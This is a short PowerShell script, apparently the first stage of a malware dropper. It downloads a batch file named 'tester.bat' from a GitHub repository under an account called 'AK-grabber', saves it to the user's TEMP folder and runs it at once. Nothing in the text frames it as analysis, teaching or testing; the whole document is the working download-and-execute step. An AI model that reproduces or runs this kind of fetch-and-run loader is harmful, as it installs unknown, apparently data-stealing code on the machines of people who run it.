$dropperUrl = "https://raw.githubusercontent.com/AK-grabber/bahofbaoufbgo9uafi/refs/heads/main/tester.bat"
$tempPath = "$env:TEMP\tester.bat"
Invoke-WebRequest -Uri $dropperUrl -OutFile $tempPath
Start-Process -FilePath $tempPath
